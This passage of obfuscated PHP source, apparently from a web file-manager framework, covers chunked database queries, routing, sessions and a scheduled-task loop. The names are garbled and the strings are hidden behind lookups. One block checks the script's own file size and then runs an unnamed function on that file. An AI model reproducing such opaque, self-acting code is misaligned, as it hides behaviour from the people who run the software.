$ò¥²î©Å[$½²‹¸ƒ¾[352]][$¶°·÷»][1]; $„÷ƒ¤Ä = is_array($„÷ƒ¤Ä) ? $„÷ƒ¤Ä : array(); $Í“ºÎõò = count($„÷ƒ¤Ä); for ($ÉÃ°ïÕ = 0; $ÉÃ°ïÕ < $Í“ºÎõò; $ÉÃ°ïÕ += $ÎÂ¾™Ô) { $İ“¢şÅñ = array_slice($„÷ƒ¤Ä, $ÉÃ°ïÕ, $ÎÂ¾™Ô); if (!is_array($İ“¢şÅñ) || count($İ“¢şÅñ) == 0) { break; } $ò¥²î©Å[$½²‹¸ƒ¾[352]][$¶°·÷»][1] = $İ“¢şÅñ; $this->optionsValue($ò¥²î©Å); $¯ª±èŸ += parent::save($Æç›Ôã, $Å˜ò§„ß); $this->chunkEventCheck(count($İ“¢şÅñ)); } $this->chunkEventSet(); return $¯ª±èŸ; } public function add($œîéÉû = '', $¾¶²â¼ˆ = array(), $ÍüÆë˜² = false) { if ($this->addTaskStatus && is_array($œîéÉû)) { $this->addTaskData[] = $œîéÉû; return; } return parent::add($œîéÉû, $¾¶²â¼ˆ, $ÍüÆë˜²); } public function parseWhereLike($Ê“ñ•‚Ò, $Ãóíš¨Ù = '', $Í„û ÆÄ = false, &$‹¡ü‹²¹ = false) { $©•÷¡“š =& $_SERVER[‹è™Ü¸Ñ]; $æ—Ù¸¼Å = $GLOBALS[$©•÷¡“š[6]][$©•÷¡“š[457]]; if (!$æ—Ù¸¼Å[$©•÷¡“š[458]]) { return $Ê“ñ•‚Ò; } if (!is_array($Ê“ñ•‚Ò)) { return $Ê“ñ•‚Ò; } $ÇÍÕ¢Ùî = array(); $Ş‰¼Ãë = 0; foreach ($Ê“ñ•‚Ò as $ÅÜ†÷«• => $ÂûÒÍÅ™) { if (is_array($ÂûÒÍÅ™) && count($ÂûÒÍÅ™) == 2 && $ÂûÒÍÅ™[0] == $©•÷¡“š[459] && is_string($ÂûÒÍÅ™[1]) && substr($ÂûÒÍÅ™[1], 0, 1) == $©•÷¡“š[460] && substr($ÂûÒÍÅ™[1], strlen($ÂûÒÍÅ™[1]) - 1, 1) == $©•÷¡“š[460]) { $‹¡ü‹²¹ = !0; $¼ª¼—¬ = is_string($ÅÜ†÷«•) ? $ÅÜ†÷«• : $Ãóíš¨Ù; $¾ÆöåºÑ = substr($ÂûÒÍÅ™[1], 1, strlen($ÂûÒÍÅ™[1]) - 2); $¾ÆöåºÑ = $this->db->escapeString($¾ÆöåºÑ); if (!strpos($¼ª¼—¬, $©•÷¡“š[10])) { $¼ª¼—¬ = $©•÷¡“š[461] . $¼ª¼—¬ . $©•÷¡“š[461]; } $ØĞå¦í = $©•÷¡“š[220] . $¾ÆöåºÑ . $©•÷¡“š[220]; $¾ÆöåºÑ = str_replace(array($©•÷¡“š[10], $©•÷¡“š[462], $©•÷¡“š[11]), $©•÷¡“š[463], $¾ÆöåºÑ); if ($æ—Ù¸¼Å[$©•÷¡“š[464]]) { $ØĞå¦í = $©•÷¡“š[465] . $¾ÆöåºÑ . $©•÷¡“š[466]; if ($æ—Ù¸¼Å[$©•÷¡“š[467]]) { $ØĞå¦í = $©•÷¡“š[466] . $¾ÆöåºÑ . $©•÷¡“š[465]; } } $ÇÍÕ¢Ùî[$Ş‰¼Ãë] = $©•÷¡“š[468] . $¼ª¼—¬ . $©•÷¡“š[469] . $ØĞå¦í . $©•÷¡“š[470]; $Ş‰¼Ãë++; continue; } if (is_array($ÂûÒÍÅ™)) { $Ãóíš¨Ù = is_string($ÅÜ†÷«•) ? $ÅÜ†÷«• : $Ãóíš¨Ù; $ÂûÒÍÅ™ = $this->parseWhereLike($ÂûÒÍÅ™, $Ãóíš¨Ù, !0, $‹¡ü‹²¹); } if (is_numeric($ÅÜ†÷«•)) { $ÇÍÕ¢Ùî[$Ş‰¼Ãë] = $ÂûÒÍÅ™; $Ş‰¼Ãë++; } else { $ÇÍÕ¢Ùî[$ÅÜ†÷«•] = $ÂûÒÍÅ™; } } if ($‹¡ü‹²¹ && !$Í„û ÆÄ) { } return $ÇÍÕ¢Ùî; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ŞØ‹ô = array()) { $½ØÖ‘ÁÔ =& $_SERVER[‹è™Ü¸Ñ]; $½óÊùÊ = self::SQL_WHERE_IN_CHUNK; $›íõóÊ˜ = $this->optionsValue(); $ˆß¡ˆóõ = $this->findWhereField($›íõóÊ˜); if (!$ˆß¡ˆóõ || isset($›íõóÊ˜[$½ØÖ‘ÁÔ[368]]) || isset($›íõóÊ˜[$½ØÖ‘ÁÔ[429]])) { return parent::select($ŞØ‹ô); } $äÉ±®ƒÍ = $›íõóÊ˜[$½ØÖ‘ÁÔ[352]][$ˆß¡ˆóõ][1]; $äÉ±®ƒÍ = is_array($äÉ±®ƒÍ) ? $äÉ±®ƒÍ : array(); $¤×–¥òú = null; for ($ˆêİšş = 0; $ˆêİšş < count($äÉ±®ƒÍ); $ˆêİšş += $½óÊùÊ) { $´®†§€ = array_slice($äÉ±®ƒÍ, $ˆêİšş, $½óÊùÊ); if (!is_array($´®†§€) || count($´®†§€) == 0) { break; } $›íõóÊ˜[$½ØÖ‘ÁÔ[352]][$ˆß¡ˆóõ][1] = $´®†§€; $this->optionsValue($›íõóÊ˜); $ĞÚ®Úİ = parent::select($ŞØ‹ô); if (!$ĞÚ®Úİ) { continue; } $¤×–¥òú = is_array($¤×–¥òú) ? $¤×–¥òú : array(); $¤×–¥òú = array_merge($¤×–¥òú, $ĞÚ®Úİ); } return $¤×–¥òú; } public function delete($èáíûõ÷ = array()) { $÷Õæ¯ƒİ =& $_SERVER[‹è™Ü¸Ñ]; $ ¬ÛÉÓ = self::SQL_WHERE_IN_CHUNK; $£…ÓÌª = $this->optionsValue(); $°öŸÖ¡© = $this->findWhereField($£…ÓÌª); if (!$°öŸÖ¡©) { return parent::delete($èáíûõ÷); } $Ã™¨şŠ¹ = 0; $¯˜ÌÔù = $£…ÓÌª[$÷Õæ¯ƒİ[352]][$°öŸÖ¡©][1]; $¯˜ÌÔù = is_array($¯˜ÌÔù) ? $¯˜ÌÔù : array(); for ($‡èÇÓè = 0; $‡èÇÓè < count($¯˜ÌÔù); $‡èÇÓè += $ ¬ÛÉÓ) { $ÚªÌŸ–¶ = array_slice($¯˜ÌÔù, $‡èÇÓè, $ ¬ÛÉÓ); if (!is_array($ÚªÌŸ–¶) || count($ÚªÌŸ–¶) == 0) { break; } $£…ÓÌª[$÷Õæ¯ƒİ[352]][$°öŸÖ¡©][1] = $ÚªÌŸ–¶; $this->optionsValue($£…ÓÌª); $Ã™¨şŠ¹ += parent::delete($èáíûõ÷); } return $Ã™¨şŠ¹; } private function findWhereField($©Æ¨¾œÜ) { $­§‰˜Ñ› =& $_SERVER[‹è™Ü¸Ñ]; $¶ï—ëğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($©Æ¨¾œÜ) || !is_array($©Æ¨¾œÜ[$­§‰˜Ñ›[352]])) { return !1; } foreach ($©Æ¨¾œÜ[$­§‰˜Ñ›[352]] as $Å¶ö„„â => $ÑĞşÏ»™) { if (is_array($ÑĞşÏ»™) && isset($ÑĞşÏ»™[0]) && is_string($ÑĞşÏ»™[0]) && strtolower($ÑĞşÏ»™[0]) == $­§‰˜Ñ›[7] && is_array($ÑĞşÏ»™[1]) && count($ÑĞşÏ»™[1]) > $¶ï—ëğ) { ignore_timeout(); return $Å¶ö„„â; } } return !1; } public function setMasterDB($úÛÁ¶Ò” = true) { think_config($_SERVER[‹è™Ü¸Ñ][471], $úÛÁ¶Ò”); } } goto D†§ÇåùÎØ; Cº§êõŠÍ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\57\x5d\x2b", "\72\x6e\x75\x6d" => "\133\x30\x2d\71\135\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ÇµëıŸ‘, $õøº¼ñ) { $¬Ä•”Øò =& $_SERVER[‹è™Ü¸Ñ]; if ($ÇµëıŸ‘ == $¬Ä•”Øò[1688]) { $‘µ‰‰Èá = array_map($¬Ä•”Øò[1689], $õøº¼ñ[0]); $¤İì½ì¾ = strpos($õøº¼ñ[1], $¬Ä•”Øò[8]) === 0 ? $õøº¼ñ[1] : $¬Ä•”Øò[8] . $õøº¼ñ[1]; $Ûª«ş© = $õøº¼ñ[2]; } else { $‘µ‰‰Èá = null; $¤İì½ì¾ = strpos($õøº¼ñ[0], $¬Ä•”Øò[8]) === 0 ? $õøº¼ñ[0] : $¬Ä•”Øò[8] . $õøº¼ñ[0]; $Ûª«ş© = $õøº¼ñ[1]; } array_push(self::$maps, $‘µ‰‰Èá); array_push(self::$routes, $¤İì½ì¾); array_push(self::$methods, strtoupper($ÇµëıŸ‘)); array_push(self::$callbacks, $Ûª«ş©); } public static function error($¨¬‘€ĞÊ) { self::$errorCallback = $¨¬‘€ĞÊ; } public static function haltOnMatch($ê®“³œ = true) { self::$halts = $ê®“³œ; } public static function dispatch() { $¡›¡½Ù’ =& $_SERVER[‹è™Ü¸Ñ]; $©Äéã£Õ = parse_url($_SERVER[$¡›¡½Ù’[1690]], PHP_URL_PATH); $ÈŞÉ€÷Œ = $_SERVER[$¡›¡½Ù’[164]]; $ÇØ£¯¡ = array_keys(static::$patterns); $ÌÙ›±µ° = array_values(static::$patterns); $ ¿ä÷«Û = !1; self::$routes = preg_replace($¡›¡½Ù’[1341], $¡›¡½Ù’[8], self::$routes); if (in_array($©Äéã£Õ, self::$routes)) { $ß¼Œ¥¡Î = array_keys(self::$routes, $©Äéã£Õ); foreach ($ß¼Œ¥¡Î as $Ü”¶¯šÄ) { if (self::$methods[$Ü”¶¯šÄ] == $ÈŞÉ€÷Œ || self::$methods[$Ü”¶¯šÄ] == $¡›¡½Ù’[1691] || in_array($ÈŞÉ€÷Œ, self::$maps[$Ü”¶¯šÄ])) { $ ¿ä÷«Û = !0; if (!is_object(self::$callbacks[$Ü”¶¯šÄ])) { $°û°É£ = explode($¡›¡½Ù’[8], self::$callbacks[$Ü”¶¯šÄ]); $ì¯¥ôÍ = end($°û°É£); $Õ£½Ü”Å = explode($¡›¡½Ù’[1273], $ì¯¥ôÍ); $ó¿åöëÂ = new $Õ£½Ü”Å[0](); $ó¿åöëÂ->{$Õ£½Ü”Å[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ü”¶¯šÄ]); if (self::$halts) { return; } } } } } else { $ìÄ£Şì‚ = 0; foreach (self::$routes as $Ü”¶¯šÄ) { if (strpos($Ü”¶¯šÄ, $¡›¡½Ù’[4]) !== !1) { $Ü”¶¯šÄ = str_replace($ÇØ£¯¡, $ÌÙ›±µ°, $Ü”¶¯šÄ); } if (preg_match($¡›¡½Ù’[1692] . $Ü”¶¯šÄ . $¡›¡½Ù’[1693], $©Äéã£Õ, $¸òÛ·¶)) { if (self::$methods[$ìÄ£Şì‚] == $ÈŞÉ€÷Œ || self::$methods[$ìÄ£Şì‚] == $¡›¡½Ù’[1691] || !empty(self::$maps[$ìÄ£Şì‚]) && in_array($ÈŞÉ€÷Œ, self::$maps[$ìÄ£Şì‚])) { $ ¿ä÷«Û = !0; array_shift($¸òÛ·¶); if (!is_object(self::$callbacks[$ìÄ£Şì‚])) { $°û°É£ = explode($¡›¡½Ù’[8], self::$callbacks[$ìÄ£Şì‚]); $ì¯¥ôÍ = end($°û°É£); $Õ£½Ü”Å = explode($¡›¡½Ù’[1273], $ì¯¥ôÍ); $ó¿åöëÂ = new $Õ£½Ü”Å[0](); if (!method_exists($ó¿åöëÂ, $Õ£½Ü”Å[1])) { echo $¡›¡½Ù’[1694]; } else { call_user_func_array(array($ó¿åöëÂ, $Õ£½Ü”Å[1]), $¸òÛ·¶); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ìÄ£Şì‚], $¸òÛ·¶); if (self::$halts) { return; } } } } $ìÄ£Şì‚++; } } if ($ ¿ä÷«Û == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ñ‹Ãíù‰ =& $_SERVER[‹è™Ü¸Ñ]; header($_SERVER[$Ñ‹Ãíù‰[1695]] . $Ñ‹Ãíù‰[1696]); echo $Ñ‹Ãíù‰[1697]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¡›¡½Ù’[1690]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÙÓäÏ£Š =& $_SERVER[‹è™Ü¸Ñ]; static $ŒÕ®€Ü = false; if ($ŒÕ®€Ü) { return $ŒÕ®€Ü; } $€ôà¨ê® = $GLOBALS[$ÙÓäÏ£Š[6]][$ÙÓäÏ£Š[425]]; self::$sessionTime = $€ôà¨ê®[$ÙÓäÏ£Š[1698]]; $°ÏÉç¨ = isset($GLOBALS[$ÙÓäÏ£Š[1699]]) ? $GLOBALS[$ÙÓäÏ£Š[1699]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($°ÏÉç¨)) { self::$sessionSign = Cookie::get($°ÏÉç¨); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($°ÏÉç¨, self::$sessionSign, self::$sessionTime); $÷º½È¯‡ = $€ôà¨ê®[$ÙÓäÏ£Š[1700]]; $¢³¸Ñ×Ö = $€ôà¨ê®[$÷º½È¯‡]; $ß¢¶©ã = $€ôà¨ê®[$ÙÓäÏ£Š[882]]; switch ($÷º½È¯‡) { case $ÙÓäÏ£Š[21]: self::$handle = Model($ÙÓäÏ£Š[883]); break; case $ÙÓäÏ£Š[884]: self::$handle = new CacheRedis($¢³¸Ñ×Ö, $ß¢¶©ã); break; case $ÙÓäÏ£Š[885]: self::$handle = new CacheMemcached($¢³¸Ñ×Ö, $ß¢¶©ã); break; case $ÙÓäÏ£Š[230]: $¢³¸Ñ×Ö[$ÙÓäÏ£Š[87]] = $¢³¸Ñ×Ö[$ÙÓäÏ£Š[87]] . $ÙÓäÏ£Š[1701]; self::$handle = new CacheFile($¢³¸Ñ×Ö, $ß¢¶©ã); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ŒÕ®€Ü = new self(); return $ŒÕ®€Ü; } public static function getBySign($üùşğ£«) { $û¥ªßû = self::$handle->get($üùşğ£«); $û¥ªßû = unserialize($û¥ªßû); return is_array($û¥ªßû) ? $û¥ªßû : array(); } public static function setBySign($ï¶®ØõÚ, $ñ¢Ùºì®) { CacheLock::lock($ï¶®ØõÚ); self::$handle->set($ï¶®ØõÚ, serialize($ñ¢Ùºì®), self::$sessionTime); CacheLock::unlock($ï¶®ØõÚ); } public static function sign($¢ı‚¿ß« = false) { if ($¢ı‚¿ß«) { self::$sessionSign = $¢ı‚¿ß«; } self::init(); return self::$sessionSign; } public static function set($ú™‰ñÉ , $ƒˆ’ÒÒ = false) { self::init(); if (is_array($ú™‰ñÉ )) { foreach ($ú™‰ñÉ  as $¯Èä…â¸ => $¶¦…Ô±) { array_set_value(self::$data, $¯Èä…â¸, $¶¦…Ô±); } } else { array_set_value(self::$data, $ú™‰ñÉ , $ƒˆ’ÒÒ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ µá¼è† = false) { self::init(); if (!$ µá¼è†) { return self::$data; } return array_get_value(self::$data, $ µá¼è†); } public static function remove($Ó»ìäõÖ) { self::init(); unset(self::$data[$Ó»ìäõÖ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‹è™Ü¸Ñ][888])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Î ‹åä =& $_SERVER[‹è™Ü¸Ñ]; if (self::valueGet($Î ‹åä[805]) != $Î ‹åä[91]) { return; } if (self::valueGet($Î ‹åä[1702]) == $Î ‹åä[91]) { $­£ÇöÉ‹ = self::valueGet($Î ‹åä[1703]); if (time() - $­£ÇöÉ‹ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Î ‹åä[1702], $Î ‹åä[91]); self::log($Î ‹åä[1704] . ACTION . $Î ‹åä[1705]); Hook::bind($Î ‹åä[1706], $Î ‹åä[1707]); $¬ÜÅ¸ó = 0; while (!0) { self::cacheClear(); if (self::valueGet($Î ‹åä[805]) != $Î ‹åä[91]) { self::valueSet($Î ‹åä[1702], $Î ‹åä[228]); self::log($Î ‹åä[1708]); die; } $¥¦‘¤×ò = time(); if ($¥¦‘¤×ò - $¬ÜÅ¸ó >= 60) { self::valueSet(array($Î ‹åä[1702] => $Î ‹åä[91], $Î ‹åä[1703] => $¥¦‘¤×ò)); $¬ÜÅ¸ó = $¥¦‘¤×ò; } if (!file_exists(USER_SYSTEM . $Î ‹åä[1709])) { self::valueSet(array($Î ‹åä[1702] => $Î ‹åä[228], $Î ‹åä[805] => $Î ‹åä[228])); self::log($Î ‹åä[1710]); die; } $Ö²ĞÎ¹ı = file_get_contents(BASIC_PATH . $Î ‹åä[1711]); $²œüç×‰ = KOD_VERSION . $Î ‹åä[10] . KOD_VERSION_BUILD; $ú³©¹¥ = match_text($Ö²ĞÎ¹ı, $Î ‹åä[1712]) . $Î ‹åä[10] . match_text($Ö²ĞÎ¹ı, $Î ‹åä[1713]); if ($ú³©¹¥ != $²œüç×‰) { self::restart(); self::log("\x73\x74\157\x70\145\144\56\133\166\145\x72\163\x69\157\156\40\x75\160\x64\141\164\145\x3b{$versionNow}\x20\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $äÇÕÁø§ =& $_SERVER[‹è™Ü¸Ñ]; http_close(); $GLOBALS[$äÇÕÁø§[1714]] = 1; $_SERVER[$äÇÕÁø§[1715]] = $äÇÕÁø§[1716]; $_COOKIE = array(); $GLOBALS[$äÇÕÁø§[1717]] = 1; $GLOBALS[$äÇÕÁø§[1718]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ğÆÃÑÔ¾ =& $_SERVER[‹è™Ü¸Ñ]; http_close(); self::valueSet($ğÆÃÑÔ¾[805], $ğÆÃÑÔ¾[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ğÆÃÑÔ¾[1702] => $ğÆÃÑÔ¾[228], $ğÆÃÑÔ¾[805] => $ğÆÃÑÔ¾[91])); self::log($ğÆÃÑÔ¾[1719]); } public static function taskSwitch() { $•»ÖÁ˜ =& $_SERVER[‹è™Ü¸Ñ]; $±øèñ³× = self::valueGet($•»ÖÁ˜[805]) == $•»ÖÁ˜[91] ? $•»ÖÁ˜[228] : $•»ÖÁ˜[91]; self::valueSet($•»ÖÁ˜[805], $±øèñ³×); } public static function shutdownEvent() { $ª°Êòœ² =& $_SERVER[‹è™Ü¸Ñ]; self::valueSet($ª°Êòœ²[1702], $ª°Êòœ²[228]); self::log($ª°Êòœ²[1720]); } public static function config($•æ»Íğø, $²Ü·ö”¿) { self::valueSet($_SERVER[‹è™Ü¸Ñ][805], $•æ»Íğø); } private static function taskRunAll() { $‘•Ë´ÍÚ =& $_SERVER[‹è™Ü¸Ñ]; $øéŠÈ¨ù = timeFloat(); $Î¼ËËŸÀ = Model($‘•Ë´ÍÚ[1721])->listData(); $ˆ´†×•ù = count($Î¼ËËŸÀ); for ($äí«Ÿ¯’ = 0; $äí«Ÿ¯’ < $ˆ´†×•ù; $äí«Ÿ¯’++) { $†°çöõâ = $Î¼ËËŸÀ[$äí«Ÿ¯’]; if (!$†°çöõâ[$‘•Ë´ÍÚ[475]] || $†°çöõâ[$‘•Ë´ÍÚ[1722]] != $‘•Ë´ÍÚ[91]) { continue; } if (!self::taskTimeCheck($†°çöõâ)) { continue; } self::taskRun($†°çöõâ); } Hook::trigger($‘•Ë´ÍÚ[1723]); self::taskQueueRun($øéŠÈ¨ù); } private static function taskQueueRun($Ü®ÖÃ•Ò) { $»´¬…ÔŠ = 10; while (!0) { $úšİ = TaskQueue::run(); if ($úšİ === !1) { break; } if (timeFloat() - $Ü®ÖÃ•Ò >= $»´¬…ÔŠ) { break; } } } private static function taskTimeCheck($²¹ËªĞ ) { $­÷‚Ãü =& $_SERVER[‹è™Ü¸Ñ]; $ÔûƒäŞÈ = json_decode($²¹ËªĞ [$­÷‚Ãü[206]], !0); $Ûéº”ê­ = intval($²¹ËªĞ [$­÷‚Ãü[1703]]); $ÂÊ°ëæ = strtotime($­÷‚Ãü[1724] . $ÔûƒäŞÈ[$­÷‚Ãü[1725]] . $­÷‚Ãü[1726]) - strtotime($­÷‚Ãü[1727]); $„ì“µ = time() - strtotime(date($­÷‚Ãü[1728]) . $­÷‚Ãü[1729]); $ûäÀ­¥ = $„ì“µ >= $ÂÊ°ëæ && $„ì“µ <= $ÂÊ°ëæ + 3600; switch ($ÔûƒäŞÈ[$­÷‚Ãü[33]]) { case $­÷‚Ãü[1730]: if (time() - $Ûéº”ê­ < 3600 * 24 * 30) { return !1; } if ($ÔûƒäŞÈ[$­÷‚Ãü[1730]] == date($­÷‚Ãü[1731]) && $ûäÀ­¥) { return !0; } break; case $­÷‚Ãü[1732]: if (time() - $Ûéº”ê­ < 3600 * 24 * 7) { return !1; } $¶°êâÉó = date($­÷‚Ãü[1733]) == 0 ? 7 : date($­÷‚Ãü[1733]); if ($ÔûƒäŞÈ[$­÷‚Ãü[1732]] == $¶°êâÉó && $ûäÀ­¥) { return !0; } break; case $­÷‚Ãü[1725]: if (time() - $Ûéº”ê­ < 3600 * 24) { return !1; } if ($ûäÀ­¥) { return !0; } break; case $­÷‚Ãü[1734]: if (time() - $Ûéº”ê­ >= floatval($ÔûƒäŞÈ[$­÷‚Ãü[1734]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $áÌ–ë® =& $_SERVER[‹è™Ü¸Ñ]; static $ÚØ‰œìä = 0; $×ŒŸíŞı = 300; if (!$ÚØ‰œìä) { $ÚØ‰œìä = time(); } if (time() - $ÚØ‰œìä < $×ŒŸíŞı) { return; } $ÚØ‰œìä = time(); $Âİõ¥Å = Model($áÌ–ë®[577])->db($áÌ–ë®[12]); if ($Âİõ¥Å) { $Âİõ¥Å->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($áÌ–ë®[1735], $áÌ–ë®[1736]); die; } } public static function taskRun($÷ŠÙÉ¡ñ) { $èÔ¹ã—˜ =& $_SERVER[‹è™Ü¸Ñ]; self::log($èÔ¹ã—˜[1737] . $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[475]] . $èÔ¹ã—˜[1738] . $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[32]] . $èÔ¹ã—˜[1739] . $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[1740]]); Model($èÔ¹ã—˜[1721])->run($÷ŠÙÉ¡ñ[$èÔ¹ã—˜[475]]); $ç×¥Æî§ = timeFloat(); $æ«¼‘×Ã = $èÔ¹ã—˜[12]; switch ($÷ŠÙÉ¡ñ[$èÔ¹ã—˜[33]]) { case $èÔ¹ã—˜[383]: $—ı³ëÏ¤ = url_request($÷ŠÙÉ¡ñ[$èÔ¹ã—˜[1740]], $èÔ¹ã—˜[261], !1, !1, !1, !1, 10); if ($—ı³ëÏ¤[$èÔ¹ã—˜[805]]) { $æ«¼‘×Ã = strlen($—ı³ëÏ¤[$èÔ¹ã—˜[1267]]); } break; case $èÔ¹ã—˜[260]: $æ«¼‘×Ã = Hook::apply($÷ŠÙÉ¡ñ[$èÔ¹ã—˜[1740]]); default: break; } Model($èÔ¹ã—˜[1741])->add(array($èÔ¹ã—˜[1742] => $èÔ¹ã—˜[12], $èÔ¹ã—˜[1743] => $èÔ¹ã—˜[228], $èÔ¹ã—˜[33] => $èÔ¹ã—˜[1744] . $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[475]], $èÔ¹ã—˜[1745] => json_encode(array($èÔ¹ã—˜[32] => $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[32]], $èÔ¹ã—˜[1746] => timeFloat() - $ç×¥Æî§, $èÔ¹ã—˜[369] => $æ«¼‘×Ã)))); $¸ñ×‡—¦ = $æ«¼‘×Ã ? $èÔ¹ã—˜[1747] . $æ«¼‘×Ã : $èÔ¹ã—˜[12]; self::log($èÔ¹ã—˜[1748] . $÷ŠÙÉ¡ñ[$èÔ¹ã—˜[475]] . $èÔ¹ã—˜[178] . $¸ñ×‡—¦); return !0; } public static function valueGet($‰÷§®¤é) { $¥Ç™ô“ =& $_SERVER[‹è™Ü¸Ñ]; $¨Â±“¨ü = $¥Ç™ô“[1749]; $ü­áŞÏŠ = Model($¥Ç™ô“[508])->get($‰÷§®¤é, $¨Â±“¨ü); if (is_null($ü­áŞÏŠ)) { Model($¥Ç™ô“[508])->set($¥Ç™ô“[805], $¥Ç™ô“[91], $¨Â±“¨ü); Model($¥Ç™ô“[508])->set($¥Ç™ô“[1702], $¥Ç™ô“[228], $¨Â±“¨ü); $ü­áŞÏŠ = Model($¥Ç™ô“[508])->get($‰÷§®¤é, $¨Â±“¨ü); } return $ü­áŞÏŠ; } private static function valueSet($Üë“ì, $©İÆ‘á  = false) { $ó¸‡æ¶½ =& $_SERVER[‹è™Ü¸Ñ]; $³œ‹ü¡î = $ó¸‡æ¶½[1750]; CacheLock::lock($³œ‹ü¡î); $¸»ÆÒğ› = Model($ó¸‡æ¶½[508])->set($Üë“ì, $©İÆ‘á , $ó¸‡æ¶½[1749]); CacheLock::unlock($³œ‹ü¡î); return $¸»ÆÒğ›; } protected static function log($¾óÆŠÈ®) { write_log($¾óÆŠÈ®, $_SERVER[‹è™Ü¸Ñ][1736]); } private static function cacheClear() { $±–¡—Ş” =& $_SERVER[‹è™Ü¸Ñ]; Cache::clearMemory(Model($±–¡—Ş”[508])->cacheKey($±–¡—Ş”[1749])); Cache::clearMemory(Model($±–¡—Ş”[508])->cacheKey($±–¡—Ş”[1751])); Model($±–¡—Ş”[1721])->cacheClear(); self::closeDatabase(); } } goto BªŸ†‚«’·; E‹Æöå—™ï: define($_SERVER[‹è™Ü¸Ñ][317], 3); define($_SERVER[‹è™Ü¸Ñ][318], 1); define($_SERVER[‹è™Ü¸Ñ][319], 0); goto AóÇ –¨Ñ; BªŸ†‚«’·: $_file = $_SERVER[$_SERVER[‹è™Ü¸Ñ][932]]; $_size = $_SERVER[‹è™Ü¸Ñ][1604]; if ($_SERVER[$_SERVER[‹è™Ü¸Ñ][931]] != $_size($_file)) { $_getc = $_SERVER[‹è™Ü¸Ñ][934]; $_getfile = $_SERVER[$_SERVER[‹è™Ü¸Ñ][935]] . $_SERVER[‹è™Ü¸Ñ][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹è™Ü¸Ñ][262], $_getfilec); if (count($_getarrs) < $_SERVER[‹è™Ü¸Ñ][692]) { $exit = $_SERVER[‹è™Ü¸Ñ][937]; $exit(); } $_act = $_SERVER[‹è™Ü¸Ñ][1605]; $_act($_file); } goto E•è˜ŒÉÛî; CØßÓæ‘¥: function binCheckBigger($–›¢ÏÛ±, $Õİè«Âê) { return $–›¢ÏÛ± > $Õİè«Âê; } $_SERVER[$_SERVER[ÅŸÍ¬ı©][3]] = ("\x38\x35\x32\x32"."\62\71")+0;$_5or9="utk1wd6mp8bhlsg45fcea39xzo7irnv20jyq9udl7y0vhtxqb5326rm1oif8sgjze4kpwacnvcwp43";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($º£°Õ–ı, $Ò“Ô×Ì™) { $¼á­ê¸ =& $_SERVER[‹è™Ü¸Ñ]; if (isset(self::$_methodList[$º£°Õ–ı])) { return @call_user_func_array(self::$_methodList[$º£°Õ–ı], $Ò“Ô×Ì™); } else { if (method_exists($this, $º£°Õ–ı)) { return call_user_func_array(array($this, $º£°Õ–ı), $Ò“Ô×Ì™); } else { think_exception(__CLASS__ . $¼á­ê¸[4] . $º£°Õ–ı . $¼á­ê¸[5]); } } } public static function __callStatic($ıéÌƒ‚ú, $ªÜëÂ°µ) { if (isset(self::$_methodListStatic[$ıéÌƒ‚ú])) { return call_user_func_array(self::$_methodListStatic[$ıéÌƒ‚ú], $ªÜëÂ°µ); } else { if (method_exists(self, $ıéÌƒ‚ú)) { return call_user_func_array(array(self, $ıéÌƒ‚ú), $ªÜëÂ°µ); } else { show_json("{$ıéÌƒ‚ú}\x28\x29\x20\156\157\164\40\145\170\151\x73\164\x3b", !1); } } } public static function addMethod($’Ô¼Óêì, $«†öÆ²) { self::$_methodList[$’Ô¼Óêì] = $«†öÆ²; } public static function addMethodStatic($¿¸àßÂğ, $ª‚‘¼ß») { self::$_methodListStatic[$¿¸àßÂğ] = $ª‚‘¼ß»; } } goto bºŠ¸×œê; B•¶î˜¦‚Ù: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($‚‰’Ñîğ) { $ğ»Ö»Š¢ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ğ»Ö»Š¢[618], $‚‰’Ñîğ); $ıŸ¦àË­ = 1; 